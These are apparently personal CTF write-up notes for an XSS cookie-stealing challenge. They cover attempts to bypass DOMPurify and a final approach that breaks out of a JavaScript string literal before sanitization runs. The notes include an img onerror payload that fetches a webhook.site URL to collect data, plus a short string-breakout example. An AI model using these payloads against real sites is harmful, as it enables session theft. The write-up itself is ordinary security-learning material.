* First look, get an XSS and share to steal cookie
* Obviously payload does not work right away
* Source shows hint of a bug at /source
* Source has a `escape_string` function that could be a potential bug
* JSON.stringify --> Did not function proper with all json objs. Possibly serialization, deserialize/obj expansion bugs possible
* Slice was weird. They apparently were getting rid of something. The quotes probably
* DOMPurify exists while rendering in client side. ( investigated a bit and hard to bypass it.)
* One possible way was to perform object expansion like `<img src=x onerror=fetch(https://webhook.site/0cf9c2e5-eb67-4828-b8ed-ff13b2e8a651)>, {ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['onerror', 'src']}`

1. My first approach was to defeat the <> sanitization. Which never really mattered as the dompurify would reestablish <> if they are within allow list
2. Bypassing DOMpurify
   1. mXSS had exploits but the version of dompurify they used seems fixed version
   2. object expansion to alter allow list did not work too... Everytime it ended up in a string, tried different combination
3. Last approach, took up to the end of ctf and help from writeups. DOMPurify cannot be bypassed instead we had to do this. Within the script tags we needed to end the string `note` and have a malicious xss within to  get executed. Eg,
```
const note = ""; alert(1);//   ---> gets executed before it enters sanitize by commas and commenting everything else
DOMPurify.sanitize(note)
```
So using such a payload should allow malicious script execution